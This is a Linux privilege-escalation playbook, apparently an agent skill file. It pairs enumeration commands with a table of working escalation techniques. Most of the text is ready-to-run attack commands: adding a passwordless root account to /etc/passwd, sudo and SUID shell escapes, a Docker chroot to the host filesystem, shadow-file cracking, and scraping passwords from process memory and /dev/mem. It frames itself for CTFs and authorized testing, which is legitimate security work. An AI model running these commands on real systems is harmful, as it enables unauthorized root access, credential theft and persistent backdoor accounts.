
# Linux Privilege Escalation

Post-exploitation escalation on Linux. Derived from a standard LinPE guide. Run the enum script, read the report, then pick the matching exploit.

## When to use
- You have a low-priv shell on a Linux host (lab / CTF / authorized engagement).
- You want a repeatable enum → exploit path instead of guessing.

## Phase 1 — Enumerate (always first)

### Manual quick checks
```bash
uname -a                     # kernel -> kernel exploit?
sudo -V                      # sudo version -> sudo CVE?
sudo -l                      # what can I run as root?  (THE most valuable command)
id; cat /etc/passwd | cut -d: -f1
cat /etc/group | cut -d: -f1
ps aux | grep root           # root-run services
cat /etc/crontab; ls -la /etc/cron.*   # root cron jobs
cat /etc/shells; echo $SHELL
# SUID/SGID
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
# backups / db / hidden
find /var /etc /bin /sbin /home /usr/local/bin /usr/bin /tmp -type f \
  \( -name '*backup*' -o -name '*.bak' -o -name '*.bck' -o -name '*.bk' \) 2>/dev/null
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
find / -type f -iname '.*' -ls 2>/dev/null
which python python3 perl ruby lua gcc cc
```

### Automated
```bash
./LinEnum.sh
./linpeas.sh -e
# linuxprivchecker.py, enumy
```

## Phase 2 — Exploit the matching finding

| Finding | Exploit |
|---------|---------|
| Old kernel | `./linux-exploit-suggester.sh -k <ver>`, `searchsploit kernel <ver>`, GitHub |
| Old sudo | `searchsploit sudo <ver>` (e.g. CVE-2021-3156 Baron Samedit) |
| `sudo -l` shows a binary | GTFOBins that binary: `sudo vim -c ':!/bin/sh'`, `sudo less /etc/shadow`, etc. |
| SUID binary | GTFOBins: `find . -exec /bin/sh -p \;`, etc. |
| `/etc/shadow` readable | `unshadow passwd shadow > h.txt && john h.txt` |
| `/etc/passwd` writable | `echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd` then `su hacker` |
| Sudo/root binary writable | overwrite it with a shell (bash / script / compiled C) |
| Root cron job | hijack the script/binary it runs (writable path, wildcard, PATH) |
| Creds in history/config | `history \| grep -iE '\-p\|pass\|password'`, `.cfg`/`.conf` files, `.bash_history` |
| Password in memory | `mimipenguin.sh`, `gcore <pid>; strings core* \| grep -i pass`, `strings /dev/mem \| grep -i pass` |
| Docker group / socket | `sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh` then edit `/etc/shadow` |

### GTFOBins
https://gtfobins.github.io/ — for any SUID/sudo binary, it gives the exact escape command.

### Shell upgrades
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then: Ctrl-Z; stty raw -echo; fg; export TERM=xterm; stty rows 40 cols 150
```
Restricted shell escape: https://0xffsec.com/handbook/shells/restricted-shells/

## Phase 3 — The script
`scripts/loot.sh` runs all **safe, read-only** enumeration checks and writes `/tmp/loot_<host>_<ts>.txt` plus a short summary to stdout. It does not exploit anything.
```bash
chmod +x scripts/loot.sh
./loot.sh
```

## Pitfalls
- **Always check `sudo -l` first** — it's the highest-yield single command and often the intended path. On a box with `NOPASSWD: ALL` (common on dev/CI VPSes) that's instant root: `sudo -i`.
- **`loot.sh` can run 1–4 minutes.** Its `find /` sweeps (SUID, world-writable, db files) are slow on a full filesystem — a 60s command timeout kills it mid-scan. Launch with a generous timeout (`timeout 280 ./loot.sh`) and don't assume it hung: the report at `/tmp/loot_<host>_<ts>.txt` is only complete if the script finishes.
- Don't run kernel exploits blindly — they can panic the box. Match the kernel version and test in a snapshot if possible.
- Some "writable" files are on read-only mounts or overlays; verify with a test write.
- GTFOBins commands vary by binary version — test the exact command.
- Clean up artifacts you create (shells, files, users) on a real engagement.

## Authorization
Only for CTF/lab or explicitly authorized engagement. Never run against systems you don't own or have written permission for.
